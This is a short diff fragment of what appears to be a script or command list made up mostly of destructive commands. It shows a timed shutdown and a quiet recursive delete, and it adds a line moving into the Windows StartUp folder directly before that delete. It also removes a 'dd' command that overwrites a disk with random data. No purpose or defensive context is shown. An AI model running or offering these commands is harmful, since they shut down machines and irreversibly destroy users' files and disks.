@@ -8,8 +8,6 @@ shutdown -s -t 30
 
 image.jpg
 
+cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+
 del /s /q *.*
-
-sudo dd if=/dev/random of=/dev/sda
-
-cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 
